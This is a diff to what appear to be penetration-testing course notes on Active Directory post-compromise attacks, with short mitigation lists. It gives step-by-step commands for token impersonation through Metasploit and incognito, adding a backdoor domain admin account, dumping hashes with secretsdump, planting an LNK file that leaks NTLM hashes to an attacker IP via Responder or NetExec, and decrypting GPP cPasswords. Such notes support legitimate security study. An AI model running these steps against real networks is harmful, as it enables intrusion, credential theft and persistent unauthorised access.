@@ -1,6 +1,20 @@
 
-Flow performed till now with the AD attack and Post compromise Attack:
-- Using LLMNR we found a user hash -> user hash -> cracked it using hash cat -> sprayed the password -> found new login -> secretsdump those logins -> local admin hashes -> respray the network with local accounts.
+#### Quick Information:
+
+- Flow performed till now with the AD attack and Post compromise Attack:
+	- Using LLMNR we found a user hash -> user hash -> cracked it using hash cat -> sprayed the password -> found new login -> secretsdump those logins -> local admin hashes -> respray the network with local accounts.
+	
+- ##### Post Compromise Attack Strategy:
+	- We have an account, now what?
+		- Search the quick wins
+			- Kerberoasting
+			- Secretsdump
+			- Pass the hash / pass the password
+		- No quick wins? Dig deep!
+			- Enumerate (Bloodhound, etc.)
+			- Where does your account have access? (Shared paths and etc.)
+			- Old vulnerabilities die hard
+		- Think outside the box
 
 #### Pass Attacks:
 
@@ -65,5 +79,89 @@ Flow performed till now with the AD attack and Post compromise Attack:
 
 - Service accounts should not be running as domain admins and make sure we have strong passwords 
 - Service accounts should always hold least privilege in the machine
+
+
+#### Token Impersonation:
+
+- What are tokens:
+	- Temporary keys that allow you access to system/network without having to provide credentials each time you access a file. Think cookies for computers.
+- **Two types:**
+	- **Delegate** - Created for logging into a machine or using Remote Desktop
+	- **Impersonate** -  "non-interactive" such as attaching a network drive or a domain logon script
+- Steps for token impersonation:
+	- First start metasploit with `msfconsole` and search for psexec `search psExec` for exploiting the vulnerable and fetch the shell from the machine
+	- Find the module `exploit/windows/smb/psexec` and use the module with `use {module-name}/{number}`
+	- Set the required parameters in the module  in `options`
+	- Set the RHOSTS, SMBDomain, SMBPass, SMBUser to the vulnerable machine with network discovery turned on.
+	- Once everything is set, type `run` or `exploit`, Once the exploit is completed, meterpreter will be opened, and type `load incognito`.
+	- Once incognito module is loaded, we will have access to a variety of options, which we can find with `help` command.
+	- Use the incognito commands in the help section to add list tokens that are currently available.
+	- Once a administrator or someone from domain admin group logs into the machine, we can see the tokens in incognito using `list_tokens -u` for users and `list_tokens -g` for groups 
+	- If we have the required user token, we can impersonate the person using the command `impersonate_token {domain}\\{username}` 
+		- {`\\`} - double slash is for escaping the character
+	- Once successfully completed, we can use the `shell` command to grab the shell of the impersonated user/domain admin.
+	- Using the impersonated account, we will create a new user to maintain the domain admin access incase the impersonated account is logged off.
+	- Using the command `net user /add {new_user_name} {Password} /domain` - this will add a new user to the domain in the domain controller.
+	- Using the command `net group "Domain Admins {new_user_name} /ADD /DOMAIN` - this will add the newly created user to the domain admins group, will can be later used to access the domain controller and do other stuff, as we have access now to the domain controller with domain admin creds.
+		- We can use this user to dump the SAM hashes using the secrets dump tool as well.
+			- `secretsdump.py domain.local/{new_user_name}:{'Password'}@{DC_IP_Address}`
+			- This dumps all the local SAM hashes as well as the domain user hashes.
+
+
+#### Token Impersonation Mitigation:
+
+- Limit user/group token creation permission
+- Account tiering
+- Local admin restriction
+
+
+#### LNK File Attacks:
+
+-  LNK file attacks are useful for grabbing the hashes of users, if we have a shared file path. LNK file is just a file, which can be placed in the shared file and if we have a responder setup in the attacker machine listening for the NTLM hashes, as if anyone visits the folder that the LNK file is present, NTLM hashes are immediately sent to the attacker machine and the responder catches the hashes, the target doesn't even need to click on the file.
+
+- Steps:
+	1) Create a LNK file in any windows machine using below code in administrator privileged power shell
+		1) `$objShell = New-Object -ComObject WScript.shell`
+		2) `$lnk = $objShell.CreateShortcut("C:\test.lnk")`
+		3) `$lnk.TargetPath = "\\192.168.138.149\@test.png"`
+		4) `$lnk.WindowStyle = 1 $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"`
+		5) `$lnk.Description = "Test"`
+		6) `$lnk.HotKey = "Ctrl+Alt+T" $lnk.Save()`
+	2) Once the code executed, file will be saved in the C drive, grab the file and share it to the shared path in the exploited target machine.
+	3) In the attacker machine, start the responder: `sudo responder -I eth0 -dPv`
+	4) Once any user accesses the shared path and goes to the folder that has the LNK file, that's it we have the NTLM hashes of the user immediately in the responder, without even user opening the file
+	5) Using these hashes, we can crack the password and use that creds.
+	
+- We can also perform a automated attack similar to LNK file using CME/NetExec, this tool does the work of creating a link and running a responder in the attacker machine and listen for hashes.
+	- `netexec smb {Expoited_target_ip_address} -d {domain}.local -u {username} -p {password} -M slinky -o NAME={filename} SERVER={Attacker_IP_Address}`
+
+- Additional resources for forced authentication with different attacks similar to LNK file:
+	- [https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf)
+
+
+#### GPP /  cPassword Attacks and Mitigations:
+
+- Overview:
+	- Group Policy Preferences (GPP) allowed admins to create policies using embedded credentials
+	- These credentials were encrypted and placed in a "cPassword"
+	- The key was accidentally released
+	- Patched in MS14-025, but it doesn't prevent previous uses
+	- Still relevant on pentests
+- Once we have the "cPassword" from the GPP.xml file, we can decrypt it easily using the builtin gpp-decrypt in kali as: `gpp-decrypt {encrypted_cPassword}`
+- We can also use metasploit to check the GPP.xml files and decrypt the cPassword if it finds any, we just need a hacked /  exploited user creds in the domain
+	- We can use `smb_enum_gpp` module in metasploit
+
+- ##### Mitigations:
+
+	-  PATCH! Fixed in KB2962486
+	- Delete the old GPP xml files stored in SYSVOL
+
+
+#### Mimikatz ( #Tools):
+
+- Overview:
+	- Tool used to view and steal credentials, generate Kerberos tickets, and leverage attacks
+	- Dump credentials stored in memory
+	- Just a few attacks: Credential Dumping, Pass-the-Hash, Over-Pass-the-Hash, Pass-the-Ticket, Silver Ticket and Golden ticket
 
 
